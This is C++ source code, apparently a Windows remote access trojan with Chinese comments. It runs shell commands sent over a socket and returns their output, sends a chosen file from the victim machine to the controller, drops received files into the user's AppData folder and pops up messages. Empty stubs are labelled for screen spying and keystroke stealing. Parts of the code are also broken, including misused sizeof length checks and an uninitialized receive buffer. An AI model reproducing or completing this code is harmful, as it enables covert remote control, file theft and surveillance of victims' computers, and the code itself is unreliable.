#include<winsock.h>
#include <iostream>
#include <windows.h>
using namespace std;
char send_msg[1024]="default_msg";
char recv_msg[1024];

/////////////////执行cmd命令/////////////////////////
void extend_cmd(char* recv_msg){
	char cmd_buf[1024]={0};
	for(int i=0; i<sizeof(string(recv_msg));i++)
	{
		cmd_buf[i]=recv_msg[i+1];
	}//处理收到的字符串
	FILE *fp = _popen(cmd_buf, "r");//创建管道
	if ((fp) == NULL) {
		std::cout<<"run cmd pip happen fault"<<std::endl;
		memcpy(send_msg,"run cmd pip happen fault",14);
	}else{
		while (fgets(recv_msg, 1024, fp) != NULL) {
			strcat(send_msg,recv_msg);
		}//拼接管道数据
	}
	_pclose(fp);
}
/////////////////下载文件至我///////////////////////////
void send_file(SOCKET s, char* fileName){
	char file_buf[128]={0};
	for(int i=0;i<sizeof((string)fileName);i++){
		file_buf[i]=fileName[i+1];
	}
	std::cout<<"upload file>>>>>"<<file_buf<<std::endl;
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	FILE* read = fopen(file_buf, "rb");
	fseek(read, 0, SEEK_END);	//将文件位置指针移动到最后
	bufSize = ftell(read);	//ftell(FILE *stream)：返回给定流stream的当前文件位置，获取当前位置相对文件首的位移，位移值等于文件所含字节数
	fseek(read, 0, SEEK_SET);	//将文件位置指针移动到开头
	buffer= new char[bufSize];
	int nCount;
	int ret = 0;
	while ((nCount = fread(buffer, 1, bufSize, read)) > 0)	//循环读取文件进行传送
	{
		ret += send(s, buffer, nCount, 0);
		cout<<"ncount--->"<<nCount<<endl;
	}
	fclose(read);
	std::cout << "send file success!"<<" Byte:"<<ret << std::endl;
}
/////////////////我上传文件////////////////////////////
void recv_file(SOCKET s,char* file_path){
	long bufSize = 10*1024;	//缓冲区大小
	char* buffer;	//缓冲区保存文件数据
	string ext_name;
	char usr_path[32];
	GetEnvironmentVariable("USERPROFILE", usr_path, 32);
	std::cout<<"file_path[1]>>>>>"<<file_path[1]<<std::endl;
	for(int i=1;i<sizeof(string(file_path));i++){
		if (file_path[i]==*"."){
			ext_name.append(&(file_path[i-1]));
			ext_name=usr_path+(string)"\\AppData\\Local\\"+ext_name;
			break;
		}
	}
	FILE* write = fopen(ext_name.c_str(), "wb");
	int nCount;
	do{
		nCount = recv(s, buffer, bufSize, 0);
		fwrite(buffer,nCount, 1, write);
	}while(nCount>=bufSize);

	fclose(write);
	send(s, "ok", 4, 0);
	std::cout << "save file success! Filename-------->"<<ext_name << std::endl;
}
////////////////////弹窗//////////////////////////////
void box_msg(char* msg){
	wchar_t msg_buf[128]={0};
	for(int i=0;i<sizeof((string)msg);i++){
		msg_buf[i]=msg[i+1];
	}
	MessageBoxW(NULL, msg_buf, L"", MB_SYSTEMMODAL);
}
////////////////////窥屏//////////////////////////////
void see(SOCKET s,char* file_path){
	
}
////////////////////键盘窃取//////////////////////////////
void hook_key(SOCKET s,char* file_path){
	
}
